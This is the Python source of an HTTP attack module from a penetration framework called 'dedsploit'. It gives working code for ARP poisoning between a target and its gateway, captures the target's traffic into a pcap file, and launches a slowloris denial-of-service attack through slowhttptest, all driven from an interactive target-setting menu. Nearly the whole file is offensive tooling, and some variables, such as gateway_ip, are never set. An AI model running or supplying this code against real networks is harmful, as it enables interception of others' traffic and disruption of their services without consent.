'''

HTTP Module for dedsploit. Attack vectors include:
1. arpspoof
2. slowloris

'''

import sys

# Incorporate mainLib for module-wide variables (i.e, colors)
sys.path.append('dedsploit/')
from mainLib import *


def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print O + "[*] Restoring target...[*]" + W
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(), signal.SIGINT)

#############################
# Using this method to obtain a given IPv4 address's physical MAC address
#############################
def get_mac(ip_address):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

#############################
# Poisoning target! Output into .pcap file. Activate restore_target() method when KeyboardInterrupt triggered
#############################
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print O + '[*] Beginning the ARP poison. Use CTRL+C to stop [*]' + W
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print G + '[*] ARP poison attack finished! [*]' + W
        return

#############################
# Main arpspoofing function! Setting interface, targets, resolving MAC addresses, etc.
#############################
def startarp(interface, gateway_ip, target_ip, packet):
    conf.iface = interface
    conf.verb = 0
    print O + "[*] Using %s as interface [*]" % (interface) + W
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print R + "[!] Failed! Cannot obtain Gateway MAC Address [!]" + W
        sys.exit()
    else:
        print O + "[*] Gateway IP %s is at %s [*]" % (gateway_ip, gateway_mac) + W
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print F + "[!] Failed! Cannot obtain Target MAC Address [!]" + W
        sys.exit()
    else:
        print O + "[*] Target IP %s is at %s [*]" % (target_ip, target_mac) + W
    poison_thread = threading.Thread(target = poison_target, args=(gateway_ip, gateway_mac, \
        target_ip, target_mac))
    poison_thread.start()
    try:
        print O + "[*] Starting sniffer for %s packets [*]" % (packet) + W
        bpf_filter = 'IP host ' + target_ip
        packets = sniff(count=packet, iface=interface)
        wrpcap('/root/output.pcap', packets)
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    except Scapy_Exception as msg:
        print R + "[!] Error! ARPSpoof failed. Reason: [!]" + msg + W
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit()

def http():
    print LISTMSG
    print http_menu
    while True:
        try:
            http_options = raw_input(LP + "[http] >> " + W )
            if http_options == "list":
                print http_menu
            elif http_options == "clear":
                os.system("clear")
            elif http_options == "exit":
                break
            elif http_options == "arpspoof":
                print arpspoof_menu
                while True:
                    pre, httpoptions = raw_input(LP + "[http] arpspoof >> " + W ).split()
                    if pre == "iface":
                        interface = httpoptions
                        print "Interface => ", interface
                        continue
                    elif pre == "target":
                        target_ip = httpoptions
                        print "Target => ", target_ip
                        continue
                    elif pre == "packet":
                        packet = httpoptions
                        print "Packets => ", packet
                        continue
                    elif pre == "start":
                        startarp(interface, gateway_ip, target_ip, packet)
            elif http_options == "slowloris":
                slowloris_menu
                while True:
                    pre, slowoptions = raw_input(LP + "[http] slowloris >> " + W).split()
                    if pre == "target":
                        ip = "http://"+slowoptions
                        print "Target IP => ", ip
                        continue
                    elif pre == "connections":
                        socket_count = slowoptions
                        print "Connections => ", socket_count
                        continue
                    elif pre == "length":
                        length = slowoptions
                        print "Length => ", length
                        continue
                    elif pre == "start":
                        call(["slowhttptest", "-c", str(socket_count), "-H", "-i 10", "-r 200", "-t GET", "-u", str(ip), "-x 24", "-p 3", "-l", str(length)])
                        break
        except ValueError:
            print WARNING
            continue
        except KeyboardInterrupt: # Ctrl + C to go back to main menu
            break
